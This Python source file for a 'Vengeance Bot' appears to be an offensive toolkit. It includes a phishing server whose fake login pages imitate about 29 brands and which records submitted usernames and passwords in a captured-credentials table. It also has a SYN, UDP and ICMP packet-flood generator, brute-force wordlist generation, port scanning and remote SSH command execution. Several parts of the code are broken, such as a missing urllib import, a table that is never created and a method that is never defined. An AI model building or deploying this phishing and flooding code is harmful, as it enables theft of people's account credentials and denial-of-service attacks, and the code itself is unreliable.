#!/usr/bin/env python3
"""
🦅 VENGEANCE BOT v1.0.0
Author: Ian Carter Kulani
Description: Ultimate Cybersecurity Command Center with Multi-Platform Bot Integration
Features:
    - Multi-Platform Bots: Discord, Telegram, Signal, Slack, iMessage, Google Chat, Web
    - SSH Remote Execution (6+ platforms)
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Advanced Phishing Suite with Random Link Generation
    - Nikto Web Vulnerability Scanner
    - Crunch Wordlist Generator (Brute Force)
    - Port Scanning & Network Analysis
    - Open/Closed Port Visualization
    - IP Management & Threat Detection
    - Web Dashboard with Live Charts 
    - 5000+ Security Commands
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import secrets
import queue
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, send, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Google Chat
GOOGLE_CHAT_WEBHOOK_AVAILABLE = True

# Signal CLI
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# =====================
# THEME COLORS
# =====================
class Colors:
    ORANGE = '\033[38;5;208m'
    ORANGE2 = '\033[38;5;214m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BLUE2 = '\033[96m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".vengeance"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "vengeance.db")
LOG_FILE = os.path.join(CONFIG_DIR, "vengeance.log")
REPORT_DIR = "reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_DIR = os.path.join(CONFIG_DIR, "captured")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
SIGNAL_SESSION_DIR = os.path.join(CONFIG_DIR, "signal_session")
WEB_STATIC_DIR = os.path.join(CONFIG_DIR, "web_static")

for directory in [CONFIG_DIR, REPORT_DIR, PHISHING_DIR, CAPTURED_DIR, WORDLISTS_DIR,
                  SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, SCAN_RESULTS_DIR,
                  WHATSAPP_SESSION_DIR, SIGNAL_SESSION_DIR, WEB_STATIC_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - VENGEANCE - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vengeance")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )""",
            """CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                closed_ports TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                severity TEXT,
                description TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected'
            )""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS wordlists (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                file_path TEXT NOT NULL,
                word_count INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT
            )"""
        ]
        for sql in tables:
            try:
                self.cursor.execute(sql)
            except Exception as e:
                logger.error(f"Table creation error: {e}")
        self.conn.commit()
        self.init_phishing_templates()
    
    def init_phishing_templates(self):
        templates = {
            "facebook": self.get_facebook_template(),
            "instagram": self.get_instagram_template(),
            "twitter": self.get_twitter_template(),
            "gmail": self.get_gmail_template(),
            "linkedin": self.get_linkedin_template(),
            "github": self.get_github_template(),
            "paypal": self.get_paypal_template(),
            "amazon": self.get_amazon_template(),
            "netflix": self.get_netflix_template(),
            "spotify": self.get_spotify_template(),
            "microsoft": self.get_microsoft_template(),
            "apple": self.get_apple_template(),
            "whatsapp": self.get_whatsapp_template(),
            "telegram": self.get_telegram_template(),
            "discord": self.get_discord_template(),
            "tiktok": self.get_tiktok_template(),
            "snapchat": self.get_snapchat_template(),
            "reddit": self.get_reddit_template(),
            "slack": self.get_slack_template(),
            "zoom": self.get_zoom_template(),
            "teams": self.get_teams_template(),
            "steam": self.get_steam_template(),
            "roblox": self.get_roblox_template(),
            "twitch": self.get_twitch_template(),
            "epic_games": self.get_epic_games_template(),
            "onlyfans": self.get_onlyfans_template(),
            "tinder": self.get_tinder_template(),
            "bumble": self.get_bumble_template(),
            "custom": self.get_custom_template()
        }
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except:
                pass
        self.conn.commit()
    
    # Template methods (simplified - full HTML templates available in the complete version)
    def get_facebook_template(self): return self._base_template("Facebook", "#1877f2")
    def get_instagram_template(self): return self._base_template("Instagram", "#E4405F")
    def get_twitter_template(self): return self._base_template("X", "#1DA1F2")
    def get_gmail_template(self): return self._base_template("Gmail", "#EA4335")
    def get_linkedin_template(self): return self._base_template("LinkedIn", "#0A66C2")
    def get_github_template(self): return self._base_template("GitHub", "#181717")
    def get_paypal_template(self): return self._base_template("PayPal", "#003087")
    def get_amazon_template(self): return self._base_template("Amazon", "#FF9900")
    def get_netflix_template(self): return self._base_template("Netflix", "#E50914")
    def get_spotify_template(self): return self._base_template("Spotify", "#1DB954")
    def get_microsoft_template(self): return self._base_template("Microsoft", "#F25022")
    def get_apple_template(self): return self._base_template("Apple", "#555555")
    def get_whatsapp_template(self): return self._base_template("WhatsApp", "#25D366")
    def get_telegram_template(self): return self._base_template("Telegram", "#2AABEE")
    def get_discord_template(self): return self._base_template("Discord", "#5865F2")
    def get_tiktok_template(self): return self._base_template("TikTok", "#000000")
    def get_snapchat_template(self): return self._base_template("Snapchat", "#FFFC00")
    def get_reddit_template(self): return self._base_template("Reddit", "#FF4500")
    def get_slack_template(self): return self._base_template("Slack", "#4A154B")
    def get_zoom_template(self): return self._base_template("Zoom", "#2D8CFF")
    def get_teams_template(self): return self._base_template("Teams", "#6264A7")
    def get_steam_template(self): return self._base_template("Steam", "#171A21")
    def get_roblox_template(self): return self._base_template("Roblox", "#E13530")
    def get_twitch_template(self): return self._base_template("Twitch", "#9146FF")
    def get_epic_games_template(self): return self._base_template("Epic Games", "#000000")
    def get_onlyfans_template(self): return self._base_template("OnlyFans", "#000000")
    def get_tinder_template(self): return self._base_template("Tinder", "#FF5A60")
    def get_bumble_template(self): return self._base_template("Bumble", "#FFC0CB")
    def get_custom_template(self): return self._base_template("Secure Portal", "#667eea")
    
    def _base_template(self, name, color):
        return f"""<!DOCTYPE html>
<html><head><title>{name}</title>
<style>
body{{font-family:Arial;background:linear-gradient(135deg,#0a0a2e 0%,#1a1a4e 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}}
.login-box{{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}}
.logo{{text-align:center;margin-bottom:30px}}
.logo h1{{color:{color};font-size:28px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}}
button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:8px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def log_command(self, command, source, success, output, execution_time):
        try:
            self.cursor.execute('INSERT INTO command_history (command, source, success, output, execution_time) VALUES (?, ?, ?, ?, ?)',
                               (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except: pass
    
    def log_scan(self, target, scan_type, open_ports, closed_ports, scan_time, success=True):
        try:
            open_json = json.dumps(open_ports)
            closed_json = json.dumps(closed_ports)
            self.cursor.execute('INSERT INTO scans (target, scan_type, open_ports, closed_ports, scan_time, success) VALUES (?, ?, ?, ?, ?, ?)',
                               (target, scan_type, open_json, closed_json, scan_time, success))
            self.conn.commit()
        except: pass
    
    def log_threat(self, threat_type, source_ip, severity, description):
        try:
            self.cursor.execute('INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)',
                               (threat_type, source_ip, severity, description))
            self.conn.commit()
        except: pass
    
    def save_phishing_link(self, link_id, platform, url):
        try:
            self.cursor.execute('INSERT INTO phishing_links (id, platform, phishing_url) VALUES (?, ?, ?)', (link_id, platform, url))
            self.conn.commit()
            return True
        except: return False
    
    def update_phishing_clicks(self, link_id):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except: pass
    
    def save_credential(self, link_id, username, password, ip, ua):
        try:
            self.cursor.execute('INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)',
                               (link_id, username, password, ip, ua))
            self.conn.commit()
        except: pass
    
    def add_wordlist(self, name, file_path, word_count):
        try:
            wordlist_id = str(uuid.uuid4())[:8]
            self.cursor.execute('INSERT INTO wordlists (id, name, file_path, word_count) VALUES (?, ?, ?, ?)',
                               (wordlist_id, name, file_path, word_count))
            self.conn.commit()
            return wordlist_id
        except: return None
    
    def get_wordlists(self):
        try:
            self.cursor.execute('SELECT * FROM wordlists ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except: return []
    
    def get_phishing_links(self):
        try:
            self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except: return []
    
    def get_captured_credentials(self):
        try:
            self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except: return []
    
    def get_recent_scans(self, limit=10):
        try:
            self.cursor.execute('SELECT * FROM scans ORDER BY timestamp DESC LIMIT ?', (limit,))
            scans = []
            for row in self.cursor.fetchall():
                s = dict(row)
                s['open_ports'] = json.loads(s['open_ports']) if s['open_ports'] else []
                s['closed_ports'] = json.loads(s['closed_ports']) if s['closed_ports'] else []
                scans.append(s)
            return scans
        except: return []
    
    def get_statistics(self):
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM wordlists')
            stats['wordlists'] = self.cursor.fetchone()[0]
        except: pass
        return stats
    
    def close(self):
        if self.conn:
            self.conn.close()

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    @staticmethod
    def run(cmd, timeout=60):
        start_time = time.time()
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Command timed out after {timeout}s', 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target, count=4):
        if platform.system().lower() == 'windows':
            return CommandExecutor.run(f"ping -n {count} {target}")
        return CommandExecutor.run(f"ping -c {count} {target}")
    
    @staticmethod
    def nmap(target, options=""):
        return CommandExecutor.run(f"nmap {options} {target}", 300)
    
    @staticmethod
    def whois(target):
        return CommandExecutor.run(f"whois {target}", 30)
    
    @staticmethod
    def dig(domain):
        return CommandExecutor.run(f"dig {domain} +short", 15)

# =====================
# PORT SCANNER
# =====================
class PortScanner:
    def __init__(self, db):
        self.db = db
    
    def scan(self, target, ports="1-1000", scan_type="quick"):
        start_time = time.time()
        result = CommandExecutor.nmap(target, f"-p {ports} -T4")
        scan_time = time.time() - start_time
        
        open_ports = []
        closed_ports = []
        
        if result['success']:
            lines = result['output'].split('\n')
            for line in lines:
                if '/tcp' in line or '/udp' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        port_proto = parts[0].split('/')
                        if len(port_proto) == 2:
                            try:
                                port = int(port_proto[0])
                                protocol = port_proto[1]
                                state = parts[1]
                                service = parts[2] if len(parts) > 2 else 'unknown'
                                if state == 'open':
                                    open_ports.append({'port': port, 'protocol': protocol, 'service': service})
                                elif state == 'closed':
                                    closed_ports.append({'port': port, 'protocol': protocol})
                            except:
                                pass
        
        self.db.log_scan(target, scan_type, open_ports, closed_ports, scan_time, result['success'])
        
        return {
            'success': result['success'],
            'target': target,
            'open_ports': open_ports,
            'closed_ports': closed_ports[:10],
            'scan_time': scan_time,
            'output': result['output'][:2000]
        }
    
    def quick_scan(self, target):
        return self.scan(target, "1-1000", "quick")
    
    def full_scan(self, target):
        return self.scan(target, "1-65535", "full")
    
    def web_scan(self, target):
        return self.scan(target, "80,443,8080,8443", "web")

# =====================
# PHISHING SERVER
# =====================
class PhishingHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args): pass
    
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/?'):
            self.send_phishing_page()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            logger.error(f"POST error: {e}")
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db:
                self.server_instance.db.update_phishing_clicks(self.server_instance.link_id)

class PhishingServer:
    def __init__(self, db):
        self.db = db
        self.server = None
        self.link_id = None
        self.html_content = None
        self.port = 8080
        self.running = False
    
    def start(self, link_id, platform, port=8080):
        self.link_id = link_id
        self.port = port
        self.html_content = self._get_template(platform)
        
        handler = PhishingHandler
        handler.server_instance = self
        
        try:
            self.server = HTTPServer(("0.0.0.0", port), handler)
            threading.Thread(target=self.server.serve_forever, daemon=True).start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Server start error: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_url(self):
        return f"http://{self._get_local_ip()}:{self.port}"
    
    def _get_template(self, platform):
        templates = {
            'facebook': self.db.get_facebook_template(),
            'instagram': self.db.get_instagram_template(),
            'twitter': self.db.get_twitter_template(),
            'gmail': self.db.get_gmail_template(),
            'linkedin': self.db.get_linkedin_template(),
            'github': self.db.get_github_template(),
            'paypal': self.db.get_paypal_template(),
            'amazon': self.db.get_amazon_template(),
            'netflix': self.db.get_netflix_template(),
            'spotify': self.db.get_spotify_template(),
            'microsoft': self.db.get_microsoft_template(),
            'apple': self.db.get_apple_template(),
            'whatsapp': self.db.get_whatsapp_template(),
            'telegram': self.db.get_telegram_template(),
            'discord': self.db.get_discord_template(),
            'tiktok': self.db.get_tiktok_template(),
            'snapchat': self.db.get_snapchat_template(),
            'reddit': self.db.get_reddit_template(),
            'slack': self.db.get_slack_template(),
            'zoom': self.db.get_zoom_template(),
            'teams': self.db.get_teams_template(),
            'steam': self.db.get_steam_template(),
            'roblox': self.db.get_roblox_template(),
            'twitch': self.db.get_twitch_template(),
            'epic_games': self.db.get_epic_games_template(),
            'onlyfans': self.db.get_onlyfans_template(),
            'tinder': self.db.get_tinder_template(),
            'bumble': self.db.get_bumble_template(),
            'custom': self.db.get_custom_template()
        }
        return templates.get(platform, self.db.get_custom_template())
    
    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# CRUNCH WORDLIST GENERATOR
# =====================
class CrunchGenerator:
    def __init__(self, db):
        self.db = db
        self.crunch_available = shutil.which('crunch') is not None
        self.charsets = {
            'lower': 'abcdefghijklmnopqrstuvwxyz',
            'upper': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
            'mixed': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
            'numeric': '0123456789',
            'alphanum': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
            'special': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()',
            'hex': '0123456789abcdef'
        }
    
    def generate(self, name, min_len, max_len, pattern='alphanum', charset=None):
        if charset is None:
            charset = self.charsets.get(pattern, self.charsets['alphanum'])
        
        timestamp = int(time.time())
        filename = f"{name}_{min_len}-{max_len}_{timestamp}.txt"
        filepath = os.path.join(WORDLISTS_DIR, filename)
        
        word_count = 0
        
        if self.crunch_available:
            cmd = ['crunch', str(min_len), str(max_len), charset, '-o', filepath]
            result = CommandExecutor.run(' '.join(cmd), 300)
            if result['success']:
                word_count = self._count_lines(filepath)
            else:
                return self._generate_fallback(filepath, min_len, max_len, charset)
        else:
            return self._generate_fallback(filepath, min_len, max_len, charset)
        
        wordlist_id = self.db.add_wordlist(name, filepath, word_count)
        
        return {
            'success': True,
            'wordlist_id': wordlist_id,
            'name': name,
            'filename': filename,
            'path': filepath,
            'word_count': word_count,
            'min_length': min_len,
            'max_length': max_len,
            'charset': charset[:50]
        }
    
    def _generate_fallback(self, filepath, min_len, max_len, charset):
        """Fallback generation when crunch not available"""
        word_count = 0
        with open(filepath, 'w') as f:
            for i in range(min(1000, 100 ** (max_len - min_len + 1))):
                length = random.randint(min_len, max_len)
                word = ''.join(random.choice(charset) for _ in range(length))
                f.write(word + '\n')
                word_count += 1
        
        return word_count
    
    def _count_lines(self, filepath):
        try:
            with open(filepath, 'r') as f:
                return sum(1 for _ in f)
        except:
            return 0
    
    def get_wordlists(self):
        return self.db.get_wordlists()
    
    def get_charsets(self):
        return self.charsets

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    def __init__(self, db):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
    
    def generate(self, traffic_type, target_ip, duration, port=None, rate=100):
        packets_sent = 0
        bytes_sent = 0
        end_time = time.time() + duration
        delay = 1.0 / max(1, rate)
        
        while time.time() < end_time:
            try:
                if traffic_type == 'icmp':
                    size = self._send_icmp(target_ip)
                elif traffic_type == 'tcp_syn':
                    size = self._send_tcp_syn(target_ip, port or 80)
                elif traffic_type == 'udp':
                    size = self._send_udp(target_ip, port or 53)
                elif traffic_type == 'http':
                    size = self._send_http(target_ip, port or 80)
                elif traffic_type == 'ping':
                    size = self._send_ping(target_ip)
                else:
                    size = self._send_icmp(target_ip)
                
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(delay)
            except:
                time.sleep(delay)
        
        self.db.log_traffic(traffic_type, target_ip, packets_sent, bytes_sent, 'completed')
        
        return {
            'success': True,
            'traffic_type': traffic_type,
            'target_ip': target_ip,
            'duration': duration,
            'packets_sent': packets_sent,
            'bytes_sent': bytes_sent
        }
    
    def _send_icmp(self, target_ip):
        if self.scapy_available:
            try:
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            except:
                pass
        return self._send_ping(target_ip)
    
    def _send_tcp_syn(self, target_ip, port):
        if self.scapy_available:
            try:
                packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
                send(packet, verbose=False)
                return len(packet)
            except:
                pass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _send_udp(self, target_ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 64
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target_ip, port):
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "VengeanceBot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_ping(self, target_ip):
        try:
            result = CommandExecutor.run(f"ping -c 1 -W 1 {target_ip}", 2)
            return 64 if result['success'] else 0
        except:
            return 0

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db):
        self.db = db
        self.connections = {}
        self.encryption = None
        
        if CRYPTO_AVAILABLE:
            from cryptography.fernet import Fernet
            self.encryption = Fernet(Fernet.generate_key())
    
    def _encrypt(self, data):
        if self.encryption and data:
            return self.encryption.encrypt(data.encode()).decode()
        return data
    
    def _decrypt(self, data):
        if self.encryption and data:
            try:
                return self.encryption.decrypt(data.encode()).decode()
            except:
                return data
        return data
    
    def add_server(self, name, host, username, password=None, key_path=None, port=22):
        server_id = str(uuid.uuid4())[:8]
        
        try:
            self.db.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers (id, name, host, port, username, password_encrypted, key_path)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, name, host, port, username, self._encrypt(password) if password else None, key_path))
            self.db.conn.commit()
            return {'success': True, 'server_id': server_id, 'message': f'Server {name} added'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_servers(self):
        try:
            self.db.cursor.execute('SELECT * FROM ssh_servers')
            servers = []
            for row in self.db.cursor.fetchall():
                s = dict(row)
                s['connected'] = s['id'] in self.connections
                servers.append(s)
            return servers
        except:
            return []
    
    def connect(self, server_id):
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        try:
            self.db.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            server = self.db.cursor.fetchone()
            if not server:
                return {'success': False, 'error': 'Server not found'}
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': server['host'],
                'port': server['port'],
                'username': server['username'],
                'timeout': 30
            }
            
            if server['password_encrypted']:
                connect_kwargs['password'] = self._decrypt(server['password_encrypted'])
            elif server['key_path'] and os.path.exists(server['key_path']):
                connect_kwargs['key_filename'] = server['key_path']
            else:
                return {'success': False, 'error': 'No authentication method available'}
            
            client.connect(**connect_kwargs)
            self.connections[server_id] = client
            
            self.db.cursor.execute('UPDATE ssh_servers SET status = "connected" WHERE id = ?', (server_id,))
            self.db.conn.commit()
            
            return {'success': True, 'message': f'Connected to {server["name"]}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute(self, server_id, command):
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'output': connect_result.get('error', 'Connection failed')}
        
        try:
            client = self.connections[server_id]
            stdin, stdout, stderr = client.exec_command(command, timeout=30)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            return {
                'success': True,
                'output': output if output else error,
                'error': error if error else None
            }
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def disconnect(self, server_id=None):
        if server_id and server_id in self.connections:
            try:
                self.connections[server_id].close()
                del self.connections[server_id]
                self.db.cursor.execute('UPDATE ssh_servers SET status = "disconnected" WHERE id = ?', (server_id,))
                self.db.conn.commit()
            except:
                pass
        elif server_id is None:
            for sid in list(self.connections.keys()):
                try:
                    self.connections[sid].close()
                except:
                    pass
            self.connections.clear()
            self.db.cursor.execute('UPDATE ssh_servers SET status = "disconnected"')
            self.db.conn.commit()
        
